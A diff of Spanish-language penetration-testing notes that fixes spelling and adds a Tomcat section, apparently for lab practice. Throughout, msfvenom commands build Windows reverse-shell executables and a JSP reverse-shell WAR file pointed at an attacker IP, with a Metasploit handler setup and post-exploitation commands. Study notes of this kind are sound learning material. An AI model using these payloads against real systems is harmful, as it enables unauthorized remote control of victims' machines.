@@ -3,7 +3,7 @@
 Tags: #Msfvenom #Metasploit #ReverShell #Payloads #Netcat #Windows 
 
 ### Netcat
-* Nos sirve para crear un binario malicioso, para despues usar metsploit y obtener la ReverShell para maquinas Windows 
+* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 
 
 ```bash
 ❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o shell.exe 
@@ -27,7 +27,7 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 
 
 ### Payload Staged 
-* Nos sirve para crear un binario malicioso, para despues usar metsploit y obtener la ReverShell para maquinas Windows 
+* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 
 
 ```bash
 ❯ msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o reverse.exe 
@@ -49,7 +49,7 @@ Ahora en Metasploit hacemos lo siguiente:
 ❯ msfdb run  # Actualiza la DB de Metasploit
 ```
 
-* Dentro de metasploit colocamos lo siguiente y asi nos pondremos en escucha:
+* Dentro de Metasploit colocamos lo siguiente y así nos pondremos en escucha:
 ```Metasploit
 ❯ use exploit/multi/handler
 ❯ set payload windows/x64/meterpreter/reverse_tcp
@@ -70,7 +70,7 @@ Ahora en Metasploit hacemos lo siguiente:
 
 
 ### Payload Non-Staged
-* Nos sirve para crear un binario malicioso, para despues usar metsploit y obtener la ReverShell para maquinas Windows 
+* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 
 
 ```bash
 ❯ msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o reverse.exe 
@@ -107,4 +107,17 @@ Ahora en Metasploit hacemos lo siguiente:
 ```bash
 ❯ getuid    # Nos muestra el usuario del servidor
 ❯ shell     # Obtenemos uns Shell en Metasploit para poder ejecutar comandos
+```
+
+
+## Tomcat 
+
+```bash 
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war
+
+	# p = Payload
+	# LHOST = Local Host (IP Atacante)
+	# LPORT = Local Port 'Atacante'
+	# f = Formato
+	# o = Exportar como 
 ```
